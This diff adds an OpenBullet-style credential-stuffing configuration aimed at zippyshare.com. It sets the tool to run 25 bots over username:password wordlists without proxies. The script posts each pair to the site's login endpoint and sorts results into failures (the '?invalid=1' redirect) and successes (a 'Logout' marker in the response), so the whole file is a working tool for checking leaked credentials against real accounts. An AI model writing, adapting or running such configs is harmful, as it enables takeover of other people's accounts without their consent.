@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "zippyshare.com",
+  "SuggestedBots": 25,
+  "LastModified": "2019-04-02T18:03:10.2086073+02:00",
+  "AdditionalInfo": "Proxyless",
+  "Author": "Wequtv",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.zippyshare.com/services/login" 
+  CONTENT "login=<USER>&pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<ADDRESS>" Contains "https://www.zippyshare.com/?invalid=1" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
